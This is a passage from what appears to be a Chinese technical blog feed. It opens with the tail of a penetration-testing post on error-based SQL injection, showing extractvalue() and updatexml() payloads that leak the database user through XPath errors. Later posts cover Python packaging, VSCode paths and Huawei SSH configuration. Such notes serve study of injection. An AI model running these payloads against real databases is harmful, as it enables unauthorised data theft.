x)a);</span></code></pre></div></div><p>由于rand的浮动，导致每次where的查询不一致造成。</p><h3 id="extractvalue-updatexml-导致Xpath路径错误"><a href="#extractvalue-updatexml-导致Xpath路径错误" class="headerlink" title="extractvalue(), updatexml() 导致Xpath路径错误"></a>extractvalue(), updatexml() 导致Xpath路径错误</h3><p><code>extractvalue(str, xpath)</code>基本型：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>()));</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>)));</span></code></pre></div></div><p>注意的是mysql版本应该大于<code>5.1.5</code><br><code>updatexml(str, xpath, str)</code>基本型：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>));</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-keyword">user</span>()),<span class="hljs-number">1</span>));</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数通高价值网站整理</title>
      <link href="/2021/12/28/%E6%95%B0%E9%80%9A%E9%AB%98%E4%BB%B7%E5%80%BC%E7%BD%91%E7%AB%99%E6%95%B4%E7%90%86/"/>
      <url>/2021/12/28/%E6%95%B0%E9%80%9A%E9%AB%98%E4%BB%B7%E5%80%BC%E7%BD%91%E7%AB%99%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<blockquote><ul><li><a href="https://software.cisco.com/download">cisco IOS 官方版本下载</a></li><li><a href="https://tfr.org/cisco-ios/">cisco IOS 旧版非官方下载</a></li></ul></blockquote><blockquote><ul><li><a href="https://support.huawei.com/enterprise/zh/doc/EDOC1000069491/d8160bc3">华为典型案例库</a></li><li><a href="https://support.huawei.com/enterprise/zh/doc/EDOC1000178157/6ddf44f8">华为 ACL应用模块的ACL默认动作和处理机制</a></li></ul></blockquote><blockquote><ul><li><a href="https://support.huawei.com/enterprise/ecareWechat?lang=zh">华为维保查询</a></li></ul></blockquote><ul><li>厂商系统日志搜索</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-vala codeBlockLines"><span class="line"><span class="hljs-meta"># huawei</span></span><span class="line">日志参考 <span class="hljs-string">&quot;NE08E&quot;</span> site:huawei.com</span><span class="line"></br></span><span class="line"><span class="hljs-meta"># h3c</span></span><span class="line">日志信息参考 site:h3c.com</span><span class="line"></br></span><span class="line"><span class="hljs-meta"># cisco</span></span><span class="line">Messages Reference <span class="hljs-string">&quot;3560&quot;</span> site:cisco.com</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 数通 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python 模块设计</title>
      <link href="/2021/12/23/python-%E6%A8%A1%E5%9D%97%E8%AE%BE%E8%AE%A1/"/>
      <url>/2021/12/23/python-%E6%A8%A1%E5%9D%97%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="文件设计"><a href="#文件设计" class="headerlink" title="文件设计"></a>文件设计</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">- setup.py</span><span class="line">- src\</span><span class="line">  \- pyaio\</span><span class="line">    - __init__.py</span><span class="line">    \- allocation\</span><span class="line">      \- domain\</span><span class="line">      \- adapters\</span><span class="line">      \- service_layer\</span><span class="line">    \- lib\</span><span class="line">- tests\</span><span class="line">  \- units\</span><span class="line">  \- integration\</span><span class="line">  \- e2e\</span><span class="line">- .env</span></code></pre></div></div><h2 id="setup-py-配置"><a href="#setup-py-配置" class="headerlink" title="setup.py 配置"></a>setup.py 配置</h2><div class="codeBlockContainer"><div class="codeBlockTitle">setup.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> setuptools <span class="hljs-keyword">import</span> setup, find_packages</span><span class="line"></br></span><span class="line">setup(</span><span class="line">    name=<span class="hljs-string">&#x27;pyaio&#x27;</span>,</span><span class="line">    version=<span class="hljs-string">&#x27;0.1.0&#x27;</span>,</span><span class="line">    python_requires=<span class="hljs-string">&quot;&gt;=3.7, &lt;4&quot;</span>,</span><span class="line marked">    packages=find_packages(<span class="hljs-string">&#x27;src&#x27;</span>),</span><span class="line marked">    package_dir=&#123;<span class="hljs-string">&#x27;&#x27;</span>: <span class="hljs-string">&quot;src&quot;</span>&#125;</span><span class="line">)</span></code></pre></div></div><p>所有引用自身包的都必须加入名称前缀，比如<code>pyaio.allocation</code></p><h2 id="解决tests中的包引入问题"><a href="#解决tests中的包引入问题" class="headerlink" title="解决tests中的包引入问题"></a>解决tests中的包引入问题</h2><p>由于不在一个文件夹下，所以<code>tests</code>中要引入包就需要参考<a href="/2021/12/23/python-VSCode-unresolved-import-%E9%97%AE%E9%A2%98/" title="python VSCode unresolved import 问题">python VSCode unresolved import 问题</a>这篇文章</p><h2 id="Test-result-not-found-for-错误"><a href="#Test-result-not-found-for-错误" class="headerlink" title="Test result not found for 错误"></a>Test result not found for 错误</h2><p>在写入口的时候，不要将包名写到根目录下<code>/pyaio.py</code>，这样会导致pytest在检查的时候会报<code>Test result not found for:</code>的错误。</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python VSCode unresolved import 问题</title>
      <link href="/2021/12/23/python-VSCode-unresolved-import-%E9%97%AE%E9%A2%98/"/>
      <url>/2021/12/23/python-VSCode-unresolved-import-%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>当使用以下结构的时候，测试无法获取到<code>src\pyaio</code>的模块路径</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">- src</span><span class="line">|- pyaio</span><span class="line">|-- __init__.py</span><span class="line">|-- main.py</span><span class="line"></br></span><span class="line">- tests</span><span class="line">|- test_main.py</span></code></pre></div></div><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>问题的原因是vscode解释器无法找到路径，解决参考<a href="https://www.pianshen.com/article/84501691762/">这篇文章</a>以及<a href="https://code.visualstudio.com/docs/python/environments#_use-of-the-pythonpath-variable">微软官方解释</a></p><p>加添<code>launch.json</code>文件</p><div class="codeBlockContainer"><div class="codeBlockTitle">.vscode/launch.json</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-json codeBlockLines"><span class="line">&#123;</span><span class="line">    <span class="hljs-comment">// 使用 IntelliSense 了解相关属性。 </span></span><span class="line">    <span class="hljs-comment">// 悬停以查看现有属性的描述。</span></span><span class="line">    <span class="hljs-comment">// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387</span></span><span class="line">    <span class="hljs-attr">&quot;version&quot;</span>: <span class="hljs-string">&quot;0.2.0&quot;</span>,</span><span class="line">    <span class="hljs-attr">&quot;configurations&quot;</span>: [</span><span class="line">        &#123;</span><span class="line">            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Python: 当前文件&quot;</span>,</span><span class="line">            <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;python&quot;</span>,</span><span class="line">            <span class="hljs-attr">&quot;request&quot;</span>: <span class="hljs-string">&quot;launch&quot;</span>,</span><span class="line">            <span class="hljs-attr">&quot;program&quot;</span>: <span class="hljs-string">&quot;$&#123;file&#125;&quot;</span>,</span><span class="line">            <span class="hljs-attr">&quot;console&quot;</span>: <span class="hljs-string">&quot;integratedTerminal&quot;</span>,</span><span class="line marked">            <span class="hljs-attr">&quot;env&quot;</span>: &#123;<span class="hljs-attr">&quot;PYTHONPATH&quot;</span>: <span class="hljs-string">&quot;$&#123;workspaceRoot&#125;&quot;</span>&#125;,</span><span class="line marked">            <span class="hljs-attr">&quot;envFile&quot;</span>: <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/.env&quot;</span></span><span class="line">        &#125;</span><span class="line">    ]</span><span class="line">&#125;</span></code></pre></div></div><p>以及根目录下添加<code>.env</code>文件</p><div class="codeBlockContainer"><div class="codeBlockTitle">.env</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">PYTHONPATH=./src</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>头发的画法</title>
      <link href="/2021/12/13/%E5%A4%B4%E5%8F%91%E7%9A%84%E7%94%BB%E6%B3%95/"/>
      <url>/2021/12/13/%E5%A4%B4%E5%8F%91%E7%9A%84%E7%94%BB%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/12/13/%E5%A4%B4%E5%8F%91%E7%9A%84%E7%94%BB%E6%B3%95/1.png"></p>]]></content>
      
      
      <categories>
          
          <category> 绘画 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Huawei SSH 配置中 ssh user 和 AAA 的关系</title>
      <link href="/2021/12/13/Huawei-SSH-%E9%85%8D%E7%BD%AE%E4%B8%AD-ssh-user-%E5%92%8C-AAA-%E7%9A%84%E5%85%B3%E7%B3%BB/"/>
      <url>/2021/12/13/Huawei-SSH-%E9%85%8D%E7%BD%AE%E4%B8%AD-ssh-user-%E5%92%8C-AAA-%E7%9A%84%E5%85%B3%E7%B3%BB/</url>
      
        <content type="html"><![CDATA[<p>当我们配置华为的SSH的配置的时候，需要除了<code>local-user</code>的配置之外，还要加上<code>ssh user</code>这个命令，为什么有了<code>local-user</code>之后，还需要<code>ssh user</code>呢？</p><h2 id="SSH-User-和-AAA-的关系"><a href="#SSH-User-和-AAA-的关系" class="headerlink" title="SSH User 和 AAA 的关系"></a>SSH User 和 AAA 的关系</h2><p>SSH 包含了 <code>stelnet</code> 和 <code>sftp</code>，所以虽然local-user配置了<code>service-type ssh</code>，但是设备还是不知道用户登录的是<code>stelnet</code>还是<code>sftp</code>，所以需要配置<code>ssh user</code>。</p><h2 id="SSH-完整登录配置"><a href="#SSH-完整登录配置" class="headerlink" title="SSH 完整登录配置"></a>SSH 完整登录配置</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-crmsh codeBlockLines"><span class="line">aaa </span><span class="line"> local-<span class="hljs-keyword">user</span> <span class="hljs-title">root</span> password cipher Root@<span class="hljs-number">123</span></span><span class="line"> local-<span class="hljs-keyword">user</span> <span class="hljs-title">root</span> service-<span class="hljs-keyword">type</span> telnet ssh </span><span class="line"> local-<span class="hljs-keyword">user</span> <span class="hljs-title">root</span> level <span class="hljs-number">3</span></span><span class="line"><span class="hljs-comment">#</span></span><span class="line">ssh <span class="hljs-keyword">user</span> <span class="hljs-title">root</span></span><span class="line">ssh <span class="hljs-keyword">user</span> <span class="hljs-title">root</span> authentication-<span class="hljs-keyword">type</span> password</span><span class="line">ssh <span class="hljs-keyword">user</span> <span class="hljs-title">root</span> service-<span class="hljs-keyword">type</span> stelnet</span></code></pre></div></div><p>这样就可以正常登录了</p><h2 id="ssh-authentication-type-default-password"><a href="#ssh-authentication-type-default-password" class="headerlink" title="ssh authentication-type default password"></a>ssh authentication-type default password</h2><p>如果嫌麻烦，可以直接配置<code>authentication-type default password</code>，这条命令代替的是以下三条命令：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-crmsh codeBlockLines"><span class="line">ssh <span class="hljs-keyword">user</span> <span class="hljs-title">xxx</span></span><span class="line">ssh <span class="hljs-keyword">user</span> <span class="hljs-title">xxx</span> authentication-<span class="hljs-keyword">type</span> password</span><span class="line">ssh <span class="hljs-keyword">user</span> <span class="hljs-title">xxx</span> service-<span class="hljs-keyword">type</span> all</span></code></pre></div></div><p>设备的逻辑顺序是：如果设备找不到<code>ssh user xxx</code>，则去找全局配置<code>ssh authentication-type default password</code>，如果能找到 <code>ssh user xxx</code>，则会根据<code>ssh user</code>的配置进行校验。</p><h2 id="V5-和-V8-设备的区别"><a href="#V5-和-V8-设备的区别" class="headerlink" title="V5 和 V8 设备的区别"></a>V5 和 V8 设备的区别</h2><p><code>ssh authentication-type default password</code>命令在大多数V5版本中是需要手动配置的，在少数新版本V5设备和V8版本设备中是默认配置。</p><p>因此在V8版本的设备中，只需要在AAA视图下配置SSH用户即可实现SSH（stelnet）登录设备的功能，做成默认配置可防止漏配置<code>ssh user</code>导致的登录失败同时也可简化配置。</p>]]></content>
      
      
      <categories>
          
          <category> 数通 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
            <tag> aaa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 打包分发(setup.py)的编写</title>
      <link href="/2021/12/03/python-%E6%89%93%E5%8C%85%E5%88%86%E5%8F%91-setup-py-%E7%9A%84%E7%BC%96%E5%86%99/"/>
      <url>/2021/12/03/python-%E6%89%93%E5%8C%85%E5%88%86%E5%8F%91-setup-py-%E7%9A%84%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2 id="python-包格式"><a href="#python-包格式" class="headerlink" title="python 包格式"></a>python 包格式</h2><p>Python的包分为源码包和二进制包，源码包就是将源码打包成一个压缩文件。而二进制包分为<code>.egg</code>和<code>.whl</code>。</p><p><code>whl</code>现在被认为是Python的标准二进制格式。</p><h2 id="setup-py-文件"><a href="#setup-py-文件" class="headerlink" title="setup.py 文件"></a>setup.py 文件</h2><p><code>setup.py</code>文件使用<code>setuptools</code>中的<code>setup()</code>函数来定义包的各种属性。 </p><h3 id="setup-函数的参数"><a href="#setup-函数的参数" class="headerlink" title="setup()函数的参数"></a>setup()函数的参数</h3><p>常见函数如下：</p><table><thead><tr><th align="center">参数</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">name</td><td align="center">包名称</td></tr><tr><td align="center">version</td><td align="center">包版本</td></tr><tr><td align="center">author</td><td align="center">程序的作者</td></tr><tr><td align="center">author_email</td><td align="center">程序的作者的邮箱地址</td></tr><tr><td align="center">maintainer</td><td align="center">维护者</td></tr><tr><td align="center">maintainer_email</td><td align="center">维护者的邮箱地址</td></tr><tr><td align="center">url</td><td align="center">程序的官网地址</td></tr><tr><td align="center">license</td><td align="center">程序的授权信息</td></tr><tr><td align="center">description</td><td align="center">程序的简单描述</td></tr><tr><td align="center">long_description</td><td align="center">程序的详细描述</td></tr><tr><td align="center">platforms</td><td align="center">程序适用的软件平台列表</td></tr><tr><td align="center">classifiers</td><td align="center">程序的所属分类列表</td></tr><tr><td align="center">keywords</td><td align="center">程序的关键字列表</td></tr><tr><td align="center">packages</td><td align="center">需要处理的包目录(通常为包含 <code>__init__.py</code> 的文件夹)</td></tr><tr><td align="center">py_modules</td><td align="center">需要打包的 Python 单文件列表</td></tr><tr><td align="center">download_url</td><td align="center">程序的下载地址</td></tr><tr><td align="center">cmdclass</td><td align="center">添加自定义命令</td></tr><tr><td align="center">package_data</td><td align="center">指定包内需要包含的数据文件</td></tr><tr><td align="center">include_package_data</td><td align="center">自动包含包内所有受版本控制(cvs/svn/git)的数据文件</td></tr><tr><td align="center">exclude_package_data</td><td align="center">当 include_package_data 为 True 时该选项用于排除部分文件</td></tr><tr><td align="center">data_files</td><td align="center">打包时需要打包的数据文件，如图片，配置文件等</td></tr><tr><td align="center">ext_modules</td><td align="center">指定扩展模块</td></tr><tr><td align="center">scripts</td><td align="center">指定可执行脚本,安装时脚本会被安装到系统 PATH 路径下</td></tr><tr><td align="center">package_dir</td><td align="center">指定哪些目录下的文件被映射到哪个源码包</td></tr><tr><td align="center">entry_points</td><td align="center">动态发现服务和插件，下面详细讲</td></tr><tr><td align="center">python_requires</td><td align="center">指定运行时需要的Python版本</td></tr><tr><td align="center">requires</td><td align="center">指定依赖的其他包</td></tr><tr><td align="center">provides</td><td align="center">指定可以为哪些模块提供依赖</td></tr><tr><td align="center">install_requires</td><td align="center">安装时需要安装的依赖包</td></tr><tr><td align="center">extras_require</td><td align="center">当前包的高级/额外特性需要依赖的分发包</td></tr><tr><td align="center">tests_require</td><td align="center">在测试时需要使用的依赖包</td></tr><tr><td align="center">setup_requires</td><td align="center">指定运行 setup.py 文件本身所依赖的包</td></tr><tr><td align="center">dependency_links</td><td align="center">指定依赖包的下载地址</td></tr><tr><td align="center">zip_safe</td><td align="center">不压缩包，而是以目录的形式安装</td></tr></tbody></table><h3 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h3><div class="codeBlockContainer"><div class="codeBlockTitle">setup.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-comment"># coding:utf-8</span></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">from</span> setuptools <span class="hljs-keyword">import</span> setup, find_packages</span><span class="line"><span class="hljs-comment"># or</span></span><span class="line"><span class="hljs-comment"># from distutils.core import setup</span></span><span class="line"></br></span><span class="line">setup(</span><span class="line">        name=<span class="hljs-string">&#x27;demo&#x27;</span>,     <span class="hljs-comment"># 包名字</span></span><span class="line">        version=<span class="hljs-string">&#x27;1.0&#x27;</span>,   <span class="hljs-comment"># 包版本</span></span><span class="line">        description=<span class="hljs-string">&#x27;This is a test of the setup&#x27;</span>,   <span class="hljs-comment"># 简单描述</span></span><span class="line">        author=<span class="hljs-string">&#x27;Elin&#x27;</span>,  <span class="hljs-comment"># 作者</span></span><span class="line">        author_email=<span class="hljs-string">&#x27;365433079@qq.com&#x27;</span>,  <span class="hljs-comment"># 作者邮箱</span></span><span class="line">        url=<span class="hljs-string">&#x27;https://github.com/Elinpf&#x27;</span>,      <span class="hljs-comment"># 包的主页</span></span><span class="line">        packages=find_packages(),                 <span class="hljs-comment"># 包</span></span><span class="line">)</span></code></pre></div></div><h3 id="文件的选择和分发"><a href="#文件的选择和分发" class="headerlink" title="文件的选择和分发"></a>文件的选择和分发</h3><div class="codeBlockContainer"><div class="codeBlockTitle">setup.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"></br></span><span class="line">setup(</span><span class="line">    <span class="hljs-comment"># 安装过程中，需要安装的静态文件，如配置文件、service文件、图片等</span></span><span class="line">    data_files=[</span><span class="line">        (<span class="hljs-string">&#x27;&#x27;</span>, [<span class="hljs-string">&#x27;conf/*.conf&#x27;</span>]),</span><span class="line">        (<span class="hljs-string">&#x27;/usr/lib/systemd/system/&#x27;</span>, [<span class="hljs-string">&#x27;bin/*.service&#x27;</span>]),</span><span class="line">                ],</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># 希望被打包的文件</span></span><span class="line">    package_data=&#123;</span><span class="line">        <span class="hljs-string">&#x27;&#x27;</span>:[<span class="hljs-string">&#x27;*.txt&#x27;</span>],</span><span class="line">        <span class="hljs-string">&#x27;bandwidth_reporter&#x27;</span>:[<span class="hljs-string">&#x27;*.txt&#x27;</span>]</span><span class="line">                &#125;,</span><span class="line">    <span class="hljs-comment"># 不打包某些文件</span></span><span class="line">    exclude_package_data=&#123;</span><span class="line">        <span class="hljs-string">&#x27;bandwidth_reporter&#x27;</span>:[<span class="hljs-string">&#x27;*.txt&#x27;</span>]</span><span class="line">                &#125;</span><span class="line">)</span></code></pre></div></div><h3 id="依赖包的描述"><a href="#依赖包的描述" class="headerlink" title="依赖包的描述"></a>依赖包的描述</h3><div class="codeBlockContainer"><div class="codeBlockTitle">setup.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">setup(</span><span class="line">    ...</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># 表明当前模块依赖哪些包，若环境中没有，则会从pypi中下载安装</span></span><span class="line">    install_requires=[<span class="hljs-string">&#x27;docutils&gt;=0.3&#x27;</span>],</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># setup.py 本身要依赖的包，这通常是为一些setuptools的插件准备的配置</span></span><span class="line">    <span class="hljs-comment"># 这里列出的包，不会自动安装。</span></span><span class="line">    setup_requires=[<span class="hljs-string">&#x27;pbr&#x27;</span>],</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># 仅在测试时需要使用的依赖，在正常发布的代码中是没有用的。</span></span><span class="line">    <span class="hljs-comment"># 在执行python setup.py test时，可以自动安装这三个库，确保测试的正常运行。</span></span><span class="line">    tests_require=[</span><span class="line">        <span class="hljs-string">&#x27;pytest&gt;=3.3.1&#x27;</span>,</span><span class="line">        <span class="hljs-string">&#x27;pytest-cov&gt;=2.5.1&#x27;</span>,</span><span class="line">    ],</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># 用于安装setup_requires或tests_require里的软件包</span></span><span class="line">    <span class="hljs-comment"># 这些信息会写入egg的 metadata 信息中</span></span><span class="line">    dependency_links=[</span><span class="line">        <span class="hljs-string">&quot;http://example2.com/p/foobar-1.0.tar.gz&quot;</span>,</span><span class="line">    ],</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># install_requires 在安装模块时会自动安装依赖包</span></span><span class="line">    <span class="hljs-comment"># 而 extras_require 不会，这里仅表示该模块会依赖这些包</span></span><span class="line">    <span class="hljs-comment"># 但是这些包通常不会使用到，只有当你深度使用模块时，才会用到，这里需要你手动安装</span></span><span class="line">    extras_require=&#123;</span><span class="line">        <span class="hljs-string">&#x27;PDF&#x27;</span>:  [<span class="hljs-string">&quot;ReportLab&gt;=1.2&quot;</span>, <span class="hljs-string">&quot;RXP&quot;</span>],</span><span class="line">        <span class="hljs-string">&#x27;reST&#x27;</span>: [<span class="hljs-string">&quot;docutils&gt;=0.3&quot;</span>],</span><span class="line">    &#125;</span><span class="line">)</span></code></pre></div></div><h3 id="安装环境的限制"><a href="#安装环境的限制" class="headerlink" title="安装环境的限制"></a>安装环境的限制</h3><div class="codeBlockContainer"><div class="codeBlockTitle">setup.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">setup(</span><span class="line">    ...</span><span class="line">    python_requires=<span class="hljs-string">&#x27;&gt;=2.7, &lt;=3&#x27;</span>,</span><span class="line">)</span></code></pre></div></div><h3 id="生成可执行文件"><a href="#生成可执行文件" class="headerlink" title="生成可执行文件"></a>生成可执行文件</h3><div class="codeBlockContainer"><div class="codeBlockTitle">setup.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> setuptools <span class="hljs-keyword">import</span> setup, find_packages</span><span class="line"></br></span><span class="line"></br></span><span class="line">setup(</span><span class="line">    ...</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># 用来支持自动生成脚本，安装后会自动生成 /usr/bin/foo 的可执行文件</span></span><span class="line">    <span class="hljs-comment"># 该文件入口指向 foo/main.py 的main 函数</span></span><span class="line">    entry_points=&#123;</span><span class="line">        <span class="hljs-string">&#x27;console_scripts&#x27;</span>: [</span><span class="line">            <span class="hljs-string">&#x27;foo = foo.main:main&#x27;</span></span><span class="line">        ]</span><span class="line">    &#125;,</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># 将 bin/foo.sh 和 bar.py 脚本，生成到系统 PATH中</span></span><span class="line">    <span class="hljs-comment"># 执行 python setup.py install 后</span></span><span class="line">    <span class="hljs-comment"># 会生成 如 /usr/bin/foo.sh 和 如 /usr/bin/bar.py</span></span><span class="line">    scripts=[<span class="hljs-string">&#x27;bin/foo.sh&#x27;</span>, <span class="hljs-string">&#x27;bar.py&#x27;</span>]</span><span class="line">)</span></code></pre></div></div><p>如果想去掉脚本的后缀，可以这样</p><div class="codeBlockContainer"><div class="codeBlockTitle">setup.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> setuptools.command.install_scripts <span class="hljs-keyword">import</span> install_scripts</span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InstallScripts</span>(<span class="hljs-params">install_scripts</span>):</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        setuptools.command.install_scripts.install_scripts.run(self)</span><span class="line"></br></span><span class="line">        <span class="hljs-comment"># Rename some script files</span></span><span class="line">        <span class="hljs-keyword">for</span> script <span class="hljs-keyword">in</span> self.get_outputs():</span><span class="line">            <span class="hljs-keyword">if</span> basename.endswith(<span class="hljs-string">&quot;.py&quot;</span>) <span class="hljs-keyword">or</span> basename.endswith(<span class="hljs-string">&quot;.sh&quot;</span>):</span><span class="line">                dest = script[:-<span class="hljs-number">3</span>]</span><span class="line">            <span class="hljs-keyword">else</span>:</span><span class="line">                <span class="hljs-keyword">continue</span></span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;moving %s to %s&quot;</span> % (script, dest))</span><span class="line">            shutil.move(script, dest)</span><span class="line"></br></span><span class="line">setup(</span><span class="line">    ...</span><span class="line">    scripts=[<span class="hljs-string">&#x27;bin/foo.sh&#x27;</span>, <span class="hljs-string">&#x27;bar.py&#x27;</span>],</span><span class="line"></br></span><span class="line">    cmdclass=&#123;</span><span class="line">        <span class="hljs-string">&quot;install_scripts&quot;</span>: InstallScripts</span><span class="line">    &#125;</span><span class="line">)</span></code></pre></div></div><h2 id="使用-setup-py-构建包"><a href="#使用-setup-py-构建包" class="headerlink" title="使用 setup.py 构建包"></a>使用 setup.py 构建包</h2><h3 id="源码包"><a href="#源码包" class="headerlink" title="源码包"></a>源码包</h3><p>使用<code>python setup.py sdist</code>命令，将源码包打包成一个tar.gz文件，并存放在dist目录中。</p><p>使用<code>easy_install xxx.tar.gz</code>命令，安装包。</p><h3 id="二进制包"><a href="#二进制包" class="headerlink" title="二进制包"></a>二进制包</h3><p>使用<code>python setup.py bdist</code>命令，将生成多个格式的二进制文件，如果想单独生成一种二进制格式：</p><ul><li><code>bdist_wininst</code> windows安装程序</li><li><code>bdist_rpm</code> rpm包</li><li><code>bdist_egg</code> python egg包</li><li><code>bdist_wheel</code> python wheel包</li></ul><h3 id="指定dist文件夹的位置"><a href="#指定dist文件夹的位置" class="headerlink" title="指定dist文件夹的位置"></a>指定dist文件夹的位置</h3><p><code>python setup.py sdist  --dist-dir=[path]</code></p><p>or</p><p><code>-d [path]</code></p><h2 id="使用-setup-py-安装包"><a href="#使用-setup-py-安装包" class="headerlink" title="使用 setup.py 安装包"></a>使用 setup.py 安装包</h2><p>多数情况使用构建包或者pip进行安装，如果需要本地安装：</p><ul><li><p><code>python setup.py install</code>命令完整安装。</p></li><li><p><code>python setup.py develop</code>命令创建软连接，有变化时不必重复安装。</p></li></ul><h2 id="如何发布到-PyPI"><a href="#如何发布到-PyPI" class="headerlink" title="如何发布到 PyPI"></a>如何发布到 PyPI</h2><p><code>python setup.py sdist upload</code> 命令发布到 PyPI</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python logging 日志模块</title>
      <link href="/2021/12/02/python-logging-%E6%97%A5%E5%BF%97%E6%A8%A1%E5%9D%97/"/>
      <url>/2021/12/02/python-logging-%E6%97%A5%E5%BF%97%E6%A8%A1%E5%9D%97/</url>
      
